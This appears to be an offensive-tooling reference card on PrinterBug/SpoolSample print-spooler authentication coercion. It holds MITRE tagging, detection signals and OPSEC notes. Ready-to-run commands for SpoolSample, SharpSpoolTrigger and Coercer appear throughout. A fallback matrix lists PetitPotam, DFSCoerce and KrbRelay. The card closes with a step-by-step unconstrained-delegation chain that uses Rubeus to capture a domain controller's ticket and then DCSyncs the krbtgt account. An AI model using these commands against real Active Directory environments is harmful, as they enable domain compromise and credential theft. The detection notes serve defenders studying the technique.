---
name: PrinterBug / SpoolSample Variants and Alternatives
category: coercion-relay
subcategories: [ms-rprn, printerbug, print-spooler-coercion, spoolsample-variants]
tradecraft_tags: [ms-rprn, printerbug, spooler, coercion, tifkin, dotnet, alternatives]
mitre_attack:
  - id: T1187
    name: Forced Authentication
source:
  url: https://github.com/leechristensen/SpoolSample
  license: Unknown
  maintained: false
binary_type: none
binary_filename: ""
supported_os: [windows]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  MS-RPRN RpcRemoteFindFirstPrinterChangeNotification calls from non-admin workstations.
  Visible as RPC traffic from workstations to DCs/servers. Event 4648 on target for the
  authentication event. Sysmon Event 3 for outbound SMB from the coerced machine to
  the listener.
usage_examples:
  - description: SpoolSample (.NET, Apollo-compatible)
    args: "SpoolSample.exe DC01.north.sevenkingdoms.local ATTACKER.north.sevenkingdoms.local"
  - description: SharpSpoolTrigger — enhanced Print Spooler coercion
    args: "SharpSpoolTrigger.exe DC01.north.sevenkingdoms.local ATTACKER"
  - description: MS-RPRN via Coercer (infrastructure-side, multiple methods)
    args: "coercer coerce -u user -p pass -d domain -l ATTACKER -t TARGET --filter-protocol-name MS-RPRN"
opsec_notes: |
  The PrinterBug (@tifkin_ / Lee Christensen) was the original authentication coercion
  technique that predated PetitPotam. When Print Spooler is enabled (check spoolsv.exe),
  MS-RPRN coercion is reliable. Multiple .NET variants exist for Apollo-based coercion.
  For maximum reliability and protocol coverage, Coercer (Python, infrastructure) tries
  all available coercion protocols in one pass.
gotchas: |
  Print Spooler must be running on the target (spoolsv.exe). Many hardened DCs now
  have Spooler disabled (post-PrintNightmare guidance). Verify first:
  `sc \\TARGET query spooler` or `Get-Service -ComputerName TARGET -Name spooler`.
  If Spooler is disabled, fall back to: MS-EFSRPC (PetitPotam), MS-DFSNM (DFSCoerce),
  KrbRelay (Windows-side-only).
related_ttps: [spoolsample, coercer, petitpotam, dfscoerce, krbrelay]
alternatives: [coercer, petitpotam, dfscoerce]
common_args: {}
last_updated: 2026-05-29
---

# PrinterBug / SpoolSample Variants Reference

The PrinterBug (MS-RPRN coercion via `RpcRemoteFindFirstPrinterChangeNotification`)
was published by Lee Christensen (@tifkin_) in 2018 and remains the most widely-used
authentication coercion technique when the Print Spooler is running.

## Available SpoolSample Variants

| Tool | Language | Notes |
|------|----------|-------|
| SpoolSample (original) | .NET | @tifkin_; Apollo-compatible |
| SharpSpoolTrigger | .NET | Enhanced variant with more options |
| PrinterBug via Coercer | Python | Infrastructure-side; tries all coercion methods |
| MS-RPRN PowerShell | PowerShell | PS-based implementation |
| Impacket printerbug.py | Python | Infrastructure-side |

## Coercion Protocol Selection Matrix

```
Target has Print Spooler running?
  YES → SpoolSample (Apollo: inline_assembly) or Coercer --filter MS-RPRN
  NO → Next options:

MS-EFSRPC (PetitPotam) available?
  YES → Coercer --filter MS-EFSRPC (not for DCs post-Aug-2021 patch)
  
MS-DFSNM available?
  YES → DFSCoerce / Coercer --filter MS-DFSNM

None available from network?
  YES → KrbRelay / SharpKrbRelay (Windows-side-only, no external listener)
```

## SpoolSample with Unconstrained Delegation

The classic unconstrained delegation chain:

```
1. Compromised machine has unconstrained delegation (TrustedForDelegation=True)
2. Rubeus.exe monitor /interval:1 /filteruser:DC01$
3. SpoolSample.exe DC01.domain.local COMPROMISED.domain.local
4. DC01$ authenticates to COMPROMISED$ → Rubeus captures TGT
5. Rubeus.exe ptt /ticket:<captured-TGT>
6. Apollo: dcsync /domain:X /user:krbtgt
```
